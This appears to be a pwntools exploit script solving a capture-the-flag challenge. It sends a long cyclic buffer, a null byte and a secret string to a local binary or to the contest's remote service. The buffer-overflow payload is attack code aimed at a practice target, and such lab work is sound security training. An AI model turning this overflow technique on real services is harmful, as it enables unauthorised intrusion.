from pwn import *

local = True
if local:
    p = process("./chal")
    input("gdb")
else:
    p = remote("cha.hackpack.club", 10995)

m = p.recvuntil(b"string: ")
print(m.split())

secret_string = b"givemetheflagpls"
# payload = b"myinput"
# payload = cyclic(100000 - 2)
# payload = cyclic(100000 - 1) + secret_string
payload =  cyclic(100000 - 1) + b"\x00" + secret_string
p.send(payload)

p.interactive()
